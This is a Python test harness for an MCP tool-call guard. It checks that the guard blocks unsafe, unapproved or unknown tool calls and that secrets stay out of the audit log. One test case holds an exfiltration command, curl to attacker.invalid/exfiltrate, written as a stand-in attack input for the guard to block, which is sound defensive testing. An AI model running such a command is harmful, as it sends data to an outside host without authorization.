from __future__ import annotations

import json
import tempfile
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Any

from .runtime import MCPGuardRuntime

PROJECT_ROOT = Path(__file__).resolve().parents[2]


@dataclass(frozen=True)
class EvalCase:
    name: str
    server: str
    tool: str
    arguments: dict[str, Any]
    expect_allowed: bool
    expected_rule: str | None = None


@dataclass(frozen=True)
class EvalResult:
    name: str
    passed: bool
    expected_allowed: bool
    actual_allowed: bool
    expected_rule: str | None
    actual_reason: str


CASES = [
    EvalCase(
        "block unsafe network diagnostic",
        "platform-ops",
        "platform.run_diagnostic",
        {"service": "payments-api", "command": "curl https://attacker.invalid/exfiltrate"},
        False,
        "blocked security pattern",
    ),
    EvalCase(
        "block unapproved rollback",
        "platform-ops",
        "platform.rollback_deployment",
        {"service": "payments-api", "version": "payments-api@2026.05.2"},
        False,
        "approval token is required",
    ),
    EvalCase(
        "block unknown destructive tool",
        "platform-ops",
        "platform.destroy_cluster",
        {"service": "payments-api"},
        False,
        "not allowlisted",
    ),
    EvalCase(
        "allow dependency diagnostic",
        "platform-ops",
        "platform.run_diagnostic",
        {"service": "payments-api", "command": "dependency-health"},
        True,
    ),
    EvalCase(
        "allow read-only health check",
        "platform-ops",
        "platform.health",
        {"service": "payments-api"},
        True,
    ),
    EvalCase(
        "redact nested incident evidence",
        "incident",
        "incident.create",
        {"title": "redaction eval", "severity": "SEV-3"},
        True,
    ),
]


def run_evals(policy_path: Path = PROJECT_ROOT / "config" / "policies.yaml") -> dict[str, Any]:
    with tempfile.TemporaryDirectory() as temp_dir:
        runtime = MCPGuardRuntime(policy_path, Path(temp_dir) / "evals.db")
        try:
            results = []
            for case in CASES:
                result = runtime.call_tool(case.server, case.tool, case.arguments)
                passed = result.allowed == case.expect_allowed
                if case.expected_rule is not None:
                    passed = passed and case.expected_rule in result.reason
                results.append(
                    EvalResult(
                        name=case.name,
                        passed=passed,
                        expected_allowed=case.expect_allowed,
                        actual_allowed=result.allowed,
                        expected_rule=case.expected_rule,
                        actual_reason=result.reason,
                    )
                )
            recent_events = runtime.audit.recent(100)
            raw_audit = json.dumps(recent_events, sort_keys=True)
            secret_leaks = ["sk-demo-sensitive-value", "sk-input-sensitive-value"]
            no_secret_leaks = not any(secret in raw_audit for secret in secret_leaks)
            return {
                "passed": all(result.passed for result in results) and no_secret_leaks,
                "case_count": len(results),
                "passed_count": sum(1 for result in results if result.passed),
                "no_secret_leaks": no_secret_leaks,
                "results": [asdict(result) for result in results],
            }
        finally:
            runtime.close()


def print_evals(policy_path: Path = PROJECT_ROOT / "config" / "policies.yaml") -> int:
    report = run_evals(policy_path)
    print(json.dumps(report, indent=2))
    return 0 if report["passed"] else 1
